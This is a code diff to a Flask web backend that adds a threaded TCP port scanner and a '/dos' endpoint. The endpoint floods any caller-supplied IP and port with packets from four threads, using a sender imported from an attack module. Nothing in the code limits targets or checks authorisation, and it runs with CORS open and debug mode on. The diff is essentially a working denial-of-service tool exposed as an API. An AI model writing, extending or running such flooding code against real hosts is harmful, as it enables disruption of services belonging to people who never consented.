@@ -1,42 +1,95 @@
+import socket
+import threading
+import time
 from flask import Flask, request, jsonify
 from flask_cors import CORS
-from .main import start_scan, start_attack
+from utils.attack import send_packet
 
 app = Flask(__name__)
 CORS(app)
 
+
+def scan_port(target, port, results, lock):
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(1)
+        result = s.connect_ex((target, port))
+        s.close()
+        status = 'open' if result == 0 else 'closed'
+        with lock:
+            results.append({'port': port, 'status': status, 'protocol': 'TCP'})
+    except Exception:
+        with lock:
+            results.append({'port': port, 'status': 'error', 'protocol': 'TCP'})
+
+
+def run_scan(target, ports):
+    threads = []
+    results = []
+    lock = threading.Lock()
+    for port in ports:
+        t = threading.Thread(target=scan_port, args=(target, port, results, lock))
+        threads.append(t)
+        t.start()
+    for t in threads:
+        t.join()
+    return results
+
+
+def run_attack(target_ip, target_port, packet_count):
+    sent = [0]
+    lock = threading.Lock()
+
+    def worker():
+        while True:
+            with lock:
+                if sent[0] >= packet_count:
+                    return
+                sent[0] += 1
+            try:
+                send_packet(target_ip, target_port)
+            except Exception:
+                pass
+            time.sleep(0.00001)
+
+    threads = []
+    for _ in range(4):
+        t = threading.Thread(target=worker)
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
+
+
 @app.route('/health', methods=['GET'])
 def health():
-    return jsonify({ 'status': 'online' })
+    return jsonify({'status': 'online'})
+
 
 @app.route('/scan', methods=['POST'])
 def scan():
     data = request.get_json()
     ip = data.get('ip')
-    start = int(data.get('portStart'))
-    end = int(data.get('portEnd'))
+    start = data.get('portStart')
+    end = data.get('portEnd')
+    if not ip or start is None or end is None:
+        return jsonify({'success': False, 'message': 'Missing fields'}), 400
+    ports = list(range(int(start), int(end) + 1))
+    results = run_scan(ip, ports)
+    return jsonify({'success': True, 'results': results})
 
-    if not ip or not start or not end:
-        return jsonify({ 'success': False, 'message': 'Missing fields' }), 400
-
-    ports = list(range(start, end + 1))
-    results = start_scan(ip, ports)
-
-    return jsonify({ 'success': True, 'results': results })
 
 @app.route('/dos', methods=['POST'])
 def dos():
     data = request.get_json()
     ip = data.get('ip')
-    port = int(data.get('port'))
-    packets = int(data.get('packetCount'))
+    port = data.get('port')
+    packets = data.get('packetCount')
+    if not ip or port is None or packets is None:
+        return jsonify({'success': False, 'message': 'Missing fields'}), 400
+    run_attack(ip, int(port), int(packets))
+    return jsonify({'success': True, 'message': f'Attack completed on {ip}:{port}'})
 
-    if not ip or not port or not packets:
-        return jsonify({ 'success': False, 'message': 'Missing fields' }), 400
-
-    start_attack(ip, port, packets)
-
-    return jsonify({ 'success': True, 'message': 'Attack completed on ' + ip + ':' + str(port) })
 
 if __name__ == '__main__':
     app.run(debug=True, port=5000)
